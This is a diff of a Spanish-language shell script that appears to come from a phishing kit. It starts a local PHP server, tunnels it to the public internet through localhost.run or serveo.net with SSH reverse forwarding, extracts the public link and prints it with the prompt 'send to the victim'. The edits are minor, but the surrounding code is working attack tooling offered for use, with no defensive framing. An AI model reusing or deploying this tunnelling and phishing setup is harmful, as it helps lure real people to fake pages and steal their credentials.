@@ -895,7 +895,6 @@ fi
 ##server
 localrun(){
 command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
-
 echo
 port=3333
 echo
@@ -905,8 +904,6 @@ sleep 2
 if [[ -f run ]];then
 rm run
 fi
-
-
 $(which sh) -c 'ssh -R 80:localhost:$port ssh.localhost.run 2> /dev/null > run ' &
 echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
 sleep 5
@@ -914,13 +911,12 @@ echo -e "$v[$b*$v]$b Abriendo local.run..."
 sleep 5
 echo -e "$v[$b*$v]$b Obteniendo links..."
 sleep 5
-
-
 envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)
 if [[ $envialink == "" ]];then
 echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
 exit 1
 else
+echo -e "$v[$b*$v]$b localhost:3333"
 echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
 cutt
 check
@@ -929,7 +925,6 @@ echo -e "$v[$b*$v]$b Enviando email..."
 fi
 check_found
 fi
-
 if [[ -f run ]]; then
 rm run
 fi
@@ -939,31 +934,27 @@ fi
 serveo(){
 command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
 echo
-
 port=3333
 echo
 php -S localhost:$port > /dev/null 2>&1 & 
 echo -e "$v[$b*$v]$b Enpezando..."
 sleep 2
-
 if [[ -f link ]]; then
 rm -rf link
 fi
-
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > link ' &
-
 echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
 sleep 5
 echo -e "$v[$b*$v]$b Abriendo serveo..."
 sleep 5
 echo -e "$v[$b*$v]$b Obteniendo links..."
 sleep 5
-
 envialink=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
 if [[ $envialink == "" ]];then
 echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
 exit 1
 else
+echo -e "$v[$b*$v]$b localhost:3333"
 echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
 cutt
 if [[ $add7 == "7" ]];then
@@ -972,7 +963,6 @@ fi
 check
 check_found
 fi
-
 if [[ -f link ]]; then
 rm -rf link
 fi
